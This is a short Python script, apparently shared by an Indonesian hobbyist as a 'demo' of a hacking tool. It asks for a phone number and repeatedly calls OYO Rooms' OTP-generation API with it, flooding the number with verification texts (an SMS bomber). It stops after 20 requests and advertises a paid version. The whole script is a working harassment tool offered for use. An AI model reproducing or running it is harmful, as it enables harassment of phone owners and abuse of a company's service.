import requests, os

os.system('clear')
c=('\033[1;36m')
r=('\033[1;31m')
g=('\033[1;32m')
w=('\033[1;37m')
print("""%s
			 Script Analog Freeze by TuanTayo%s
 
 %sAuthor : TuanTayo%s
 %sEmail : cyber.tuantayo@gmail.com%s
 %sGithub : https://github.com/TuanTayo%s
 %sSpesial Thanks To : All Members Hidden Group%s
 '"'   '"'
"""%(c,r,g,r,g,r,g,r,g,r,w,r))
i=int(0)
no=input("%sMasukan Code Hack > %s"%(g,w))
while True:
	idk=('status')
	r=requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+no+'&country_code=+62')
	if str(idk) in str(r.text):
		print("[+] SUKSES")
	else:
		print("[-] GAGAL")
		print("%s[!] Mau Beli versi Berbayar Contact Me via Email"%(r))
		break
	i+=1
	if i == 20:
		print("%s[!] Terima Kasih Sudah Mencoba versi DEMO"%(r))
		break

